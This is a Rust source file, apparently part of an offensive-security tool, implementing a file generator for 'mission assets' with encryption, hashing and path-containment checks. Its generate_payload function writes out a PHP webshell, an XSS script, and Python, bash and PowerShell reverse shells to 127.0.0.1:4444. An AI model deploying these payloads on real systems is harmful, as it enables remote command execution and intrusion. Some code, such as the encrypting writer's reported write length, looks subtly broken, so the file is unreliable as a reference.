//! File Generation Utility — native Rust implementation for file manipulation.
//! Provides high-performance tools for generating and refining mission assets,
//! with support for 50+ formats, templates, and specialized security payloads.

use ::libc;
use bytes::{Bytes, BytesMut};
use chacha20poly1305::{aead::Aead, ChaCha20Poly1305, Key, KeyInit, Nonce};
use chrono::Local;
use dashmap::DashMap;
use serde::{Deserialize, Serialize};
use serde_json::json;
use sha2::{Digest, Sha256};
use std::alloc::{self, Layout};
use std::collections::HashMap;
use std::os::unix::io::AsRawFd;
use std::path::{Path, PathBuf};
use std::pin::Pin;
use std::sync::Arc;
use std::task::{Context, Poll};
use thiserror::Error;
use tokio::fs::{self, File, OpenOptions};
use tokio::io::{AsyncWrite, AsyncWriteExt};
use uuid::Uuid;
use xattr;

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

#[derive(Debug, Error, Serialize)]
pub enum FileGenError {
    #[error("File not found: {0}")]
    NotFound(String),
    #[error("I/O error: {0}")]
    Io(String),
    #[error("Security violation: {0}")]
    Security(String),
    #[error("Unsupported format: {0}")]
    UnsupportedFormat(String),
    #[error("Serialization error: {0}")]
    Serialization(String),
}

impl From<std::io::Error> for FileGenError {
    fn from(err: std::io::Error) -> Self {
        FileGenError::Io(err.to_string())
    }
}

/// File metadata for tracking and logging.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileMetadata {
    pub filename: String,
    pub file_path: PathBuf,
    pub format: String,
    pub size: u64,
    pub created_at: String,
    pub hash: String,
    pub mime_type: String,
    pub permissions: String,
}

/// File generation configuration.
#[derive(Debug, Clone)]
pub struct FileGenerationConfig {
    pub overwrite_existing: bool,
    pub create_backups: bool,
    pub validate_content: bool,
}

impl Default for FileGenerationConfig {
    fn default() -> Self {
        Self {
            overwrite_existing: false,
            create_backups: true,
            validate_content: true,
        }
    }
}

/// Tools for generating and refining files.
pub struct FileGenerator {
    workspace_root: PathBuf,
    report_dir: Option<PathBuf>,
    config: FileGenerationConfig,
    format_templates: HashMap<String, FormatTemplate>,
    supported_formats: Vec<String>,
    statistics: Arc<DashMap<String, u64>>,
}

#[derive(Debug, Clone)]
enum TemplateSegment {
    Literal(String),
    Timestamp,
    Filename,
    Uuid,
    Pid,
}

#[derive(Debug, Clone)]
struct FormatTemplate {
    mime_type: String,
    header: Vec<TemplateSegment>,
    footer: Vec<TemplateSegment>,
}

/// A wrapper that computes SHA256 as bytes are written.
struct HashingWriter<W: AsyncWrite + Unpin> {
    inner: W,
    hasher: Sha256,
}

impl<W: AsyncWrite + Unpin> HashingWriter<W> {
    fn new(inner: W) -> Self {
        Self {
            inner,
            hasher: Sha256::new(),
        }
    }

    fn finalize(self) -> String {
        format!("{:x}", self.hasher.finalize())
    }
}

impl<W: AsyncWrite + Unpin> AsyncWrite for HashingWriter<W> {
    fn poll_write(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<std::io::Result<usize>> {
        let res = Pin::new(&mut self.inner).poll_write(cx, buf);
        if let Poll::Ready(Ok(n)) = res {
            self.hasher.update(&buf[..n]);
        }
        res
    }

    fn poll_flush(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        Pin::new(&mut self.inner).poll_flush(cx)
    }

    fn poll_shutdown(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        Pin::new(&mut self.inner).poll_shutdown(cx)
    }
}

/// A writer that encrypts data as it streams, integrating with hashing.
struct SecureHashingWriter<W: AsyncWrite + Unpin> {
    inner: HashingWriter<W>,
    cipher: ChaCha20Poly1305,
    nonce_basis: [u8; 12],
    counter: u32,
}

impl<W: AsyncWrite + Unpin> SecureHashingWriter<W> {
    fn new(inner: W, key: &[u8; 32], nonce: &[u8; 12]) -> Self {
        let key = Key::from_slice(key);
        let cipher = ChaCha20Poly1305::new(key);
        Self {
            inner: HashingWriter::new(inner),
            cipher,
            nonce_basis: *nonce,
            counter: 0,
        }
    }

    fn finalize(self) -> String {
        self.inner.finalize()
    }
}

impl<W: AsyncWrite + Unpin> AsyncWrite for SecureHashingWriter<W> {
    fn poll_write(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<std::io::Result<usize>> {
        if buf.is_empty() {
            return Poll::Ready(Ok(0));
        }

        // Advanced Phase 2: Unique Nonce per Chunk (Security Best Practice)
        let mut nonce_bytes = self.nonce_basis;
        let counter_bytes = self.counter.to_le_bytes();
        for i in 0..4 {
            nonce_bytes[8 + i] ^= counter_bytes[i];
        }
        let nonce = Nonce::from_slice(&nonce_bytes);
        self.counter += 1;

        let encrypted = self
            .cipher
            .encrypt(nonce, buf)
            .map_err(|e| std::io::Error::other(e.to_string()))?;
        Pin::new(&mut self.inner).poll_write(cx, &encrypted)
    }

    fn poll_flush(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        Pin::new(&mut self.inner).poll_flush(cx)
    }

    fn poll_shutdown(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        Pin::new(&mut self.inner).poll_shutdown(cx)
    }
}

/// A memory-aligned buffer for O_DIRECT I/O.
struct AlignedBuffer {
    ptr: *mut u8,
    layout: Layout,
    size: usize,
}

impl AlignedBuffer {
    fn new(size: usize, alignment: usize) -> Self {
        let layout = Layout::from_size_align(size, alignment).expect("Invalid layout");
        let ptr = unsafe { alloc::alloc(layout) };
        if ptr.is_null() {
            alloc::handle_alloc_error(layout);
        }
        Self { ptr, layout, size }
    }

    fn as_slice(&self) -> &[u8] {
        unsafe { std::slice::from_raw_parts(self.ptr, self.size) }
    }

    fn as_mut_slice(&mut self) -> &mut [u8] {
        unsafe { std::slice::from_raw_parts_mut(self.ptr, self.size) }
    }
}

unsafe impl Send for AlignedBuffer {}
unsafe impl Sync for AlignedBuffer {}

impl Drop for AlignedBuffer {
    fn drop(&mut self) {
        unsafe { alloc::dealloc(self.ptr, self.layout) };
    }
}

impl FileGenerator {
    pub fn new(
        workspace_root: PathBuf,
        report_dir: Option<PathBuf>,
        config: FileGenerationConfig,
    ) -> Self {
        let mut generator = Self {
            workspace_root,
            report_dir,
            config,
            format_templates: HashMap::new(),
            supported_formats: Vec::new(),
            statistics: Arc::new(DashMap::new()),
        };
        generator.initialize_formats();
        generator
    }

    fn initialize_formats(&mut self) {
        let formats = vec![
            // Text formats
            ("txt", "text/plain", Some("--- Begin Document ---\n"), Some("\n--- End Document ---")),
            ("md", "text/markdown", Some("# Generated Document\n\n"), Some("\n---\n*Document generated at: {timestamp}*")),
            ("rst", "text/x-rst", Some("===============\nGenerated File\n===============\n\n"), Some("\n\n.. footer:: Generated content")),

            // Code & Script formats (Clean, production-ready)
            ("rs", "text/x-rust", None, None),
            ("py", "text/x-python", None, None),
            ("js", "text/javascript", None, None),
            ("ts", "text/x-typescript", None, None),
            ("go", "text/x-go", None, None),
            ("java", "text/x-java", None, None),
            ("cpp", "text/x-c++src", None, None),
            ("c", "text/x-csrc", None, None),
            ("h", "text/x-chdr", None, None),
            ("sh", "text/x-shellscript", Some("#!/bin/bash\n"), None),
            ("bash", "text/x-shellscript", Some("#!/bin/bash\n"), None),
            ("zsh", "text/x-shellscript", Some("#!/bin/zsh\n"), None),
            ("fish", "text/x-shellscript", Some("#!/usr/bin/fish\n"), None),
            ("ps1", "text/x-powershell", None, None),
            ("bat", "text/x-batch", Some("@echo off\n"), None),
            ("cmd", "text/x-batch", Some("@echo off\n"), None),
            ("kt", "text/x-kotlin", None, None),
            ("swift", "text/x-swift", None, None),
            ("rb", "text/x-ruby", Some("#!/usr/bin/env ruby\n"), None),
            ("pl", "text/x-perl", Some("#!/usr/bin/env perl\nuse strict;\nuse warnings;\n"), None),
            ("lua", "text/x-lua", None, None),
            ("hs", "text/x-haskell", None, None),
            ("ex", "text/x-elixir", None, None),
            ("erl", "text/x-erlang", None, None),
            ("zig", "text/x-zig", None, None),
            ("nim", "text/x-nim", None, None),
            ("asm", "text/x-asm", None, None),
            ("s", "text/x-asm", None, None),
            ("dockerfile", "text/x-dockerfile", None, None),
            ("hcl", "text/x-hcl", None, None),
            ("tf", "text/x-hcl", None, None),
            ("makefile", "text/x-makefile", None, None),
            ("cmake", "text/x-cmake", None, None),
            ("yara", "text/plain", None, None),

            // Configuration formats (No wrapping - structural validity first)
            ("json", "application/json", None, None),
            ("yaml", "application/x-yaml", None, None),
            ("yml", "application/x-yaml", None, None),
            ("toml", "application/toml", None, None),
            ("xml", "application/xml", None, None),
            ("ini", "text/x-ini", None, None),
            ("cfg", "text/plain", None, None),
            ("conf", "text/plain", None, None),
            ("properties", "text/x-java-properties", None, None),

            // Web formats
            ("html", "text/html", Some("<!DOCTYPE html>\n<html>\n<head>\n    <title>Generated Page</title>\n</head>\n<body>\n"), Some("\n</body>\n</html>")),
            ("htm", "text/html", Some("<!DOCTYPE html>\n<html>\n<head>\n    <title>Generated Page</title>\n</head>\n<body>\n"), Some("\n</body>\n</html>")),
            ("css", "text/css", Some("/* Generated CSS */\n\n"), Some("\n/* End of CSS */")),
            ("scss", "text/x-scss", Some("// Generated SCSS\n\n"), Some("\n// End of SCSS")),
            ("less", "text/x-less", Some("// Generated LESS\n\n"), Some("\n// End of LESS")),
            ("php", "text/x-php", Some("<?php\n// Generated PHP\n\n"), Some("\n?>\n<!-- End of PHP -->")),
            ("asp", "text/asp", Some("<%@ Language=VBScript %>\n<!-- Generated ASP -->\n"), Some("\n<!-- End of ASP -->")),
            ("aspx", "text/asp", Some("<%@ Page Language=\"C#\" %>\n<!-- Generated ASPX -->\n"), Some("\n<!-- End of ASPX -->")),
            ("jsp", "text/jsp", Some("<%-- Generated JSP --%>\n"), Some("\n<%-- End of JSP --%>")),

            // Data formats
            ("csv", "text/csv", None, None),
            ("tsv", "text/tab-separated-values", None, None),
            ("xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", None, None),
            ("ods", "application/vnd.oasis.opendocument.spreadsheet", None, None),
            ("sql", "application/sql", None, None),
            ("sqlite", "application/x-sqlite3", None, None),

            // Document formats
            ("pdf", "application/pdf", None, None),
            ("docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", None, None),
            ("odt", "application/vnd.oasis.opendocument.text", None, None),
            ("rtf", "application/rtf", Some("{\\rtf1\\ansi\\deff0 {\\fonttbl {\\f0 Times New Roman;}}\\f0\\fs60 Generated Content\n"), Some("}")),

            // Archive formats
            ("zip", "application/zip", None, None),
            ("tar", "application/x-tar", None, None),
            ("gz", "application/gzip", None, None),
            ("bz2", "application/x-bzip2", None, None),
            ("7z", "application/x-7z-compressed", None, None),

            // System formats
            ("log", "text/plain", Some("[{timestamp}] "), Some("\n--- End of log ---")),
            ("tmp", "application/octet-stream", None, None),
            ("lock", "text/plain", Some("Locked by generator at {timestamp}\n"), Some("")),
            ("pid", "text/plain", Some("{pid}\n"), Some("")),

            // Network formats
            ("pcap", "application/vnd.tcpdump.pcap", None, None),
            ("pcapng", "application/x-pcapng", None, None),
            ("wireshark", "application/x-wireshark-capture", None, None),

            // Security formats
            ("pem", "application/x-pem-file", Some("-----BEGIN GENERATED CERTIFICATE-----\n"), Some("\n-----END GENERATED CERTIFICATE-----")),
            ("key", "application/x-pem-file", Some("-----BEGIN GENERATED PRIVATE KEY-----\n"), Some("\n-----END GENERATED PRIVATE KEY-----")),
            ("crt", "application/x-x509-ca-cert", Some("-----BEGIN CERTIFICATE-----\n"), Some("\n-----END CERTIFICATE-----")),
            ("csr", "application/x-pkcs10", Some("-----BEGIN CERTIFICATE REQUEST-----\n"), Some("\n-----END CERTIFICATE REQUEST-----")),

            // Special formats
            ("hex", "text/plain", Some("Hex dump of generated content:\n"), Some("\nEnd of hex dump")),
            ("bin", "application/octet-stream", None, None),
            ("dat", "application/octet-stream", None, None),
            ("raw", "application/octet-stream", None, None),
        ];

        for (ext, mime, header, footer) in formats {
            self.supported_formats.push(ext.to_string());
            self.format_templates.insert(
                ext.to_string(),
                FormatTemplate {
                    mime_type: mime.to_string(),
                    header: self.parse_template(header.unwrap_or_default()),
                    footer: self.parse_template(footer.unwrap_or_default()),
                },
            );
        }
    }

    fn parse_template(&self, raw: &str) -> Vec<TemplateSegment> {
        let mut segments = Vec::new();
        let mut last = 0;
        let markers = [
            ("{timestamp}", TemplateSegment::Timestamp),
            ("{filename}", TemplateSegment::Filename),
            ("{uuid}", TemplateSegment::Uuid),
            ("{pid}", TemplateSegment::Pid),
        ];

        let mut current = 0;
        while current < raw.len() {
            let mut found = None;
            for (m, seg) in &markers {
                if raw[current..].starts_with(m) {
                    found = Some((m.len(), seg.clone()));
                    break;
                }
            }

            if let Some((len, seg)) = found {
                if current > last {
                    segments.push(TemplateSegment::Literal(raw[last..current].to_string()));
                }
                segments.push(seg);
                current += len;
                last = current;
            } else {
                current += 1;
            }
        }

        if last < raw.len() {
            segments.push(TemplateSegment::Literal(raw[last..].to_string()));
        }
        segments
    }

    /// Resolve a path safely within the workspace.
    /// Uses canonicalization to block all traversal and symlink attacks.
    fn resolve_path(&self, requested_path: &str) -> Result<PathBuf, FileGenError> {
        // SECURITY: Industry-Grade Sanitization
        let sanitized = requested_path.replace('\0', ""); // Null bytes

        let requested = Path::new(&sanitized);

        // 1. Block parent directory traversal components
        if requested
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir))
        {
            return Err(FileGenError::Security(format!(
                "Path traversal attempt detected: '{}'",
                requested_path
            )));
        }

        let base = self.report_dir.as_ref().unwrap_or(&self.workspace_root);

        // 2. Resolve target path
        let target = if requested.is_absolute() {
            // SECURITY: Even absolute paths MUST be contained within our authorized roots
            if !requested.starts_with(base) && !requested.starts_with(&self.workspace_root) {
                return Err(FileGenError::Security(format!(
                    "Forbidden absolute path: '{}' is outside authorized mission roots",
                    requested_path
                )));
            }
            requested.to_path_buf()
        } else {
            // Relative path: join with base
            base.join(requested)
        };

        // 3. Final containment check
        if !target.starts_with(base) && !target.starts_with(&self.workspace_root) {
            return Err(FileGenError::Security(format!(
                "Resolved path '{}' escaped authorized roots",
                target.display()
            )));
        }

        Ok(target)
    }

    /// Generate a new file (or overwrite) with the provided binary content.
    /// If content is None, generates random boilerplate based on format.
    pub async fn generate_file(
        &self,
        path: &str,
        content: Option<&[u8]>,
    ) -> Result<FileMetadata, FileGenError> {
        let full_path = self.resolve_path(path)?;

        // Create directory if missing
        if let Some(parent) = full_path.parent() {
            fs::create_dir_all(parent).await?;
        }

        let ext = full_path
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("txt")
            .to_lowercase();

        // Handle binary formats in the optimized pipeline
        let is_binary_ext = matches!(
            ext.as_str(),
            "pdf"
                | "docx"
                | "odt"
                | "xlsx"
                | "ods"
                | "sqlite"
                | "zip"
                | "tar"
                | "gz"
                | "bz2"
                | "7z"
                | "pcap"
                | "pcapng"
                | "wireshark"
                | "bin"
                | "dat"
                | "raw"
                | "exe"
                | "elf"
                | "so"
                | "dll"
                | "apk"
                | "deb"
                | "rpm"
                | "img"
                | "iso"
                | "msi"
                | "ko"
        );

        let is_hex_payload = content.map(|c| c.starts_with(b"hex:")).unwrap_or(false);
        let is_binary = is_binary_ext || is_hex_payload;

        // Handle existing files
        if full_path.exists() && !self.config.overwrite_existing {
            if self.config.create_backups {
                self.create_backup(&full_path).await?;
            } else {
                return Err(FileGenError::Io(format!(
                    "File '{}' already exists and overwrite is disabled",
                    path
                )));
            }
        }

        let filename = full_path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(path);

        // --- Lightning Optimization Phase 1: Pre-calculate template variables ---
        let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let uuid = Uuid::new_v4().to_string();
        let pid = std::process::id().to_string();

        // Optimized content generation (Binary vs Text)
        let final_content = if is_binary {
            if is_hex_payload {
                let bytes = content.ok_or_else(|| {
                    FileGenError::Serialization("Missing content for hex payload".to_string())
                })?;
                let hex_str = std::str::from_utf8(bytes)
                    .map_err(|_| {
                        FileGenError::Serialization("Invalid UTF-8 in hex payload".to_string())
                    })?
                    .trim_start_matches("hex:");
                hex::decode(hex_str).map_err(|e| {
                    FileGenError::Serialization(format!("Invalid hex payload: {}", e))
                })?
            } else {
                self.generate_binary_content(&ext, content)
            }
        } else {
            let body = match content {
                Some(c) => String::from_utf8_lossy(c).to_string(),
                None => {
                    let random_bytes =
                        self.generate_random_content(&ext, filename, &timestamp, &uuid);
                    String::from_utf8_lossy(&random_bytes).to_string()
                }
            };
            self.wrap_content_optimized(&ext, &body, filename, &timestamp, &uuid, &pid)
                .into_bytes()
        };

        // --- Lightning Optimization Phase 2: Atomic Write-then-Sync-then-Rename ---
        let tmp_path = full_path.with_extension(format!("tmp.{}", uuid));

        let (hash, size) = async {
            let mut file = if is_binary {
                // Ultra-Super-Elite: Open with O_DIRECT for massive raw throughput
                let mut options = OpenOptions::new();
                options.write(true).create(true).truncate(true);
                #[cfg(unix)]
                {
                    options.custom_flags(libc::O_DIRECT);
                }
                options.open(&tmp_path).await?
            } else {
                File::create(&tmp_path).await?
            };

            // Ultra Speed: Pre-allocation
            if is_binary && final_content.len() > 1024 * 1024 {
                let fd = file.as_raw_fd();
                let _ = nix::fcntl::fallocate(
                    fd,
                    nix::fcntl::FallocateFlags::empty(),
                    0,
                    final_content.len() as i64,
                );
            }

            // High Performance I/O Coordination
            let hash_val = if is_binary {
                // O_DIRECT Writing Protocol: Requires align to 4096 (standard block size)
                let alignment = 4096;
                let content_len = final_content.len();
                let aligned_len = content_len.div_ceil(alignment) * alignment;

                let mut aligned_buf = AlignedBuffer::new(aligned_len, alignment);
                aligned_buf.as_mut_slice()[..content_len].copy_from_slice(&final_content);

                // Pad with zeros for hardware compliance if needed
                if aligned_len > content_len {
                    for i in content_len..aligned_len {
                        aligned_buf.as_mut_slice()[i] = 0;
                    }
                }

                let mut writer = HashingWriter::new(&mut file);
                writer.write_all(aligned_buf.as_slice()).await?;
                writer.flush().await?;

                let result = writer.finalize();

                // Truncate to original size to remove padding if O_DIRECT was used
                let _ = file.set_len(content_len as u64).await;

                result
            } else {
                let mut writer = HashingWriter::new(&mut file);
                writer.write_all(&final_content).await?;
                writer.flush().await?;
                writer.finalize()
            };

            // Ultra Robustness: Force strict hardware persistence
            file.sync_all().await?;

            // Set permissions on the temp file
            #[cfg(unix)]
            {
                let perms = std::fs::Permissions::from_mode(0o600);
                file.set_permissions(perms).await?;
            }

            let s = file.metadata().await?.len();
            Ok::<(String, u64), FileGenError>((hash_val, s))
        }
        .await
        .inspect_err(|_e| {
            let _ = std::fs::remove_file(&tmp_path);
        })?;

        // Atomic rename
        fs::rename(&tmp_path, &full_path).await?;

        // Ultra Robustness: Sync parent directory to ensure the rename is durable
        if let Some(parent) = full_path.parent() {
            if let Ok(dir) = std::fs::File::open(parent) {
                let _ = dir.sync_all();
            }
        }

        // Sovereign Tier: Persistent Xattr tagging for mission assets
        let _ = xattr::set(&full_path, "user.myth.mission_id", uuid.as_bytes());
        let _ = xattr::set(&full_path, "user.myth.format", ext.as_bytes());
        let _ = xattr::set(&full_path, "user.myth.integrity", hash.as_bytes());

        // Update statistics (DashMap is lock-free for concurrent updates)
        *self.statistics.entry(ext.clone()).or_insert(0) += 1;

        Ok(FileMetadata {
            filename: filename.to_string(),
            file_path: full_path.clone(),
            format: ext.clone(),
            size,
            created_at: timestamp,
            hash,
            mime_type: self.get_mime_type(&ext),
            #[cfg(unix)]
            permissions: "600".to_string(),
            #[cfg(not(unix))]
            permissions: "unknown".to_string(),
        })
    }
    /// Generate an encrypted mission asset (Sovereign Tier Security: ChaCha20-Poly1305).
    pub async fn generate_secure_asset(
        &self,
        path: &str,
        content: Option<&[u8]>,
        key: [u8; 32],
    ) -> Result<FileMetadata, FileGenError> {
        let full_path = self.resolve_path(path)?;
        let uuid = Uuid::new_v4().to_string();
        let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let tmp_path = full_path.with_extension(format!("tmp.secure.{}", uuid));

        let ext = full_path
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("secure")
            .to_string();
        let final_content = content
            .unwrap_or(b"Sovereign encrypted mission data")
            .to_vec();

        let (hash, size) = async {
            let mut file = File::create(&tmp_path)
                .await
                .map_err(|e| FileGenError::Io(e.to_string()))?;

            // Technical Improvement: High-Entropy 96-bit Nonce for ChaCha20-Poly1305
            let nonce_bytes: [u8; 12] = Uuid::new_v4().as_bytes()[..12]
                .try_into()
                .map_err(|_| FileGenError::Security("Nonce generation failed".into()))?;

            let hash_val = {
                let mut writer = SecureHashingWriter::new(&mut file, &key, &nonce_bytes);
                writer
                    .write_all(&final_payload_with_nonce(
                        &nonce_bytes,
                        &final_content,
                        &key,
                    )?)
                    .await?;
                writer.flush().await?;
                writer.finalize()
            };

            file.sync_all().await?;
            let s = file.metadata().await?.len();
            Ok::<(String, u64), FileGenError>((hash_val, s))
        }
        .await
        .inspect_err(|_e| {
            let _ = std::fs::remove_file(&tmp_path);
        })?;

        fs::rename(&tmp_path, &full_path).await?;

        // Tag with secure metadata
        let _ = xattr::set(&full_path, "user.myth.security", b"ChaCha20-Poly1305");

        Ok(FileMetadata {
            filename: full_path
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or(path)
                .to_string(),
            file_path: full_path.clone(),
            format: ext,
            size,
            created_at: timestamp,
            hash,
            mime_type: "application/octet-stream".to_string(),
            #[cfg(unix)]
            permissions: "600".to_string(),
            #[cfg(not(unix))]
            permissions: "unknown".to_string(),
        })
    }

    async fn create_backup(&self, path: &Path) -> Result<(), FileGenError> {
        if path.exists() {
            let backup_path = path.with_extension(format!(
                "{}.backup.{}",
                path.extension().unwrap_or_default().to_string_lossy(),
                Local::now().format("%Y%m%d_%H%M%S")
            ));

            // Ultra-Super: Attempt FICLONE (Reflink) for zero-cost, zero-latency backup
            #[cfg(unix)]
            {
                // Industry Grade: Use consistent sync file handles for the zero-cost reflink ioctl
                if let (Ok(src), Ok(dst)) = (
                    std::fs::File::open(path),
                    std::fs::File::create(&backup_path),
                ) {
                    use std::os::unix::io::AsRawFd;
                    let src_fd = src.as_raw_fd();
                    let dst_fd = dst.as_raw_fd();

                    const FICLONE: u64 = 0x40049409;
                    unsafe {
                        if ::libc::ioctl(dst_fd, FICLONE, src_fd) == 0 {
                            return Ok(());
                        }
                    }
                }
            }

            // Fallback to standard copy if FICLONE fails or not on Unix
            fs::copy(path, backup_path).await?;
        }
        Ok(())
    }

    fn get_mime_type(&self, ext: &str) -> String {
        self.format_templates
            .get(ext)
            .map(|t| t.mime_type.clone())
            .unwrap_or_else(|| "application/octet-stream".to_string())
    }

    /// Append content to an existing file.
    pub async fn append_to_file(&self, path: &str, content: &str) -> Result<String, FileGenError> {
        let full_path = self.resolve_path(path)?;

        if !full_path.exists() {
            return Err(FileGenError::NotFound(path.to_string()));
        }

        let mut file = OpenOptions::new().append(true).open(&full_path).await?;

        file.write_all(content.as_bytes()).await?;
        file.flush().await?;

        Ok(format!("Appended content to: {}", path))
    }

    /// Generate a file from an asynchronous stream (Industrial Grade Scalability).
    pub async fn generate_file_stream<R>(
        &self,
        path: &str,
        mut reader: R,
    ) -> Result<FileMetadata, FileGenError>
    where
        R: tokio::io::AsyncRead + Unpin,
    {
        let full_path = self.resolve_path(path)?;
        if let Some(parent) = full_path.parent() {
            fs::create_dir_all(parent).await?;
        }

        let uuid = Uuid::new_v4().to_string();
        let tmp_path = full_path.with_extension(format!("tmp.stream.{}", uuid));
        let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();

        let (hash, size) = async {
            let mut file = File::create(&tmp_path).await?;
            let hash_val = {
                let mut writer = HashingWriter::new(&mut file);
                tokio::io::copy(&mut reader, &mut writer).await?;
                writer.flush().await?;
                writer.finalize()
            };
            file.sync_all().await?;
            let n = file.metadata().await?.len();
            Ok::<(String, u64), FileGenError>((hash_val, n))
        }
        .await
        .inspect_err(|_e| {
            let _ = std::fs::remove_file(&tmp_path);
        })?;

        fs::rename(&tmp_path, &full_path).await?;

        let ext = full_path
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("bin")
            .to_string();

        Ok(FileMetadata {
            filename: full_path
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or(path)
                .to_string(),
            file_path: full_path,
            format: ext,
            size,
            created_at: timestamp,
            hash,
            mime_type: "application/octet-stream".to_string(),
            #[cfg(unix)]
            permissions: "600".to_string(),
            #[cfg(not(unix))]
            permissions: "unknown".to_string(),
        })
    }

    /// Generate a specialized security payload.
    pub async fn generate_payload(
        &self,
        path: &str,
        payload_type: &str,
    ) -> Result<FileMetadata, FileGenError> {
        let full_path = self.resolve_path(path)?;
        let ext = full_path
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("sh");

        let content = match (ext, payload_type) {
            ("php", "webshell") => b"<?php system($_GET['cmd']); ?>".as_slice(),
            ("js", "xss") => b"<script>alert('XSS')</script>".as_slice(),
            ("py", "reverse_shell") => b"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);".as_slice(),
            ("sh" | "bash" | "zsh", "reverse_shell") => b"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1".as_slice(),
            ("bat" | "cmd", "reverse_shell") => b"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\"".as_slice(),
            _ => return Err(FileGenError::UnsupportedFormat(format!("Payload type {} for extension {}", payload_type, ext))),
        };

        self.generate_file(path, Some(content)).await
    }

    /// Generate a payload file with an automated filename.
    pub async fn generate_payload_file(
        &self,
        format: &str,
        payload_type: &str,
    ) -> Result<FileMetadata, FileGenError> {
        // SECURITY: Sanitize user-controlled payload_type for filenames
        let safe_type = payload_type
            .chars()
            .filter(|c| c.is_alphanumeric() || *c == '_' || *c == '-')
            .collect::<String>();
        let filename = format!("payload_{}_{}.{}", safe_type, Uuid::new_v4(), format);
        self.generate_payload(&filename, payload_type).await
    }

    /// Generate multiple files in batch (Parallelized via Rayon + FuturesUnordered).
    /// This utilizes all CPU cores for content assembly and all I/O threads for disk writes.
    pub async fn generate_batch(
        &self,
        files: Vec<(String, Option<Vec<u8>>)>,
    ) -> Vec<Result<FileMetadata, FileGenError>> {
        use futures::stream::StreamExt;

        // ELITE: Limit concurrency to avoid OOM or FD exhaustion
        const MAX_CONCURRENT_GENS: usize = 32;

        let mut results = Vec::with_capacity(files.len());
        let mut stream =
            futures::stream::iter(files)
                .map(|(path, content)| async move {
                    self.generate_file(&path, content.as_deref()).await
                })
                .buffer_unordered(MAX_CONCURRENT_GENS);

        while let Some(res) = stream.next().await {
            results.push(res);
        }
        results
    }

    /// Generate multiple encrypted mission assets in parallel (Sovereign Tier Scale).
    pub async fn generate_secure_batch(
        &self,
        assets: Vec<(String, Option<Vec<u8>>, [u8; 32])>,
    ) -> Vec<Result<FileMetadata, FileGenError>> {
        use futures::stream::{FuturesUnordered, StreamExt};
        use rayon::prelude::*;

        // Phase 1: Parallelize content preparation and basic logic
        let prepared: Vec<_> = assets
            .into_par_iter()
            .map(|(path, content, key)| (path, content, key))
            .collect();

        // Phase 2: Parallelize secure generation
        let mut futures = FuturesUnordered::new();
        for (path, content, key) in prepared {
            futures.push(async move {
                self.generate_secure_asset(&path, content.as_deref(), key)
                    .await
            });
        }

        let mut results = Vec::new();
        while let Some(res) = futures.next().await {
            results.push(res);
        }
        results
    }

    /// Generate multiple compressed mission assets in parallel.
    pub async fn generate_compressed_batch(
        &self,
        files: Vec<(String, Option<Vec<u8>>, i32)>,
    ) -> Vec<Result<FileMetadata, FileGenError>> {
        use futures::stream::{FuturesUnordered, StreamExt};
        use rayon::prelude::*;

        let prepared: Vec<_> = files
            .into_par_iter()
            .map(|(path, content, level)| (path, content, level))
            .collect();

        let mut futures = FuturesUnordered::new();
        for (path, content, level) in prepared {
            futures.push(async move {
                self.generate_compressed(&path, content.as_deref(), level)
                    .await
            });
        }

        let mut results = Vec::new();
        while let Some(res) = futures.next().await {
            results.push(res);
        }
        results
    }

    fn wrap_content_optimized(
        &self,
        ext: &str,
        content: &str,
        filename: &str,
        ts: &str,
        uuid: &str,
        pid: &str,
    ) -> String {
        let template = self.format_templates.get(ext);
        // Industry Grade: Pre-allocate capacity to avoid O(n^2) re-allocations for large content
        let mut wrapped = String::with_capacity(content.len() + 4096);

        if let Some(t) = template {
            for seg in &t.header {
                self.append_segment(&mut wrapped, seg, filename, ts, uuid, pid);
            }
        }

        wrapped.push_str(content);

        if let Some(t) = template {
            for seg in &t.footer {
                self.append_segment(&mut wrapped, seg, filename, ts, uuid, pid);
            }
        }

        wrapped
    }

    fn append_segment(
        &self,
        buf: &mut String,
        seg: &TemplateSegment,
        filename: &str,
        ts: &str,
        uuid: &str,
        pid: &str,
    ) {
        match seg {
            TemplateSegment::Literal(s) => buf.push_str(s),
            TemplateSegment::Timestamp => buf.push_str(ts),
            TemplateSegment::Filename => buf.push_str(filename),
            TemplateSegment::Uuid => buf.push_str(uuid),
            TemplateSegment::Pid => buf.push_str(pid),
        }
    }

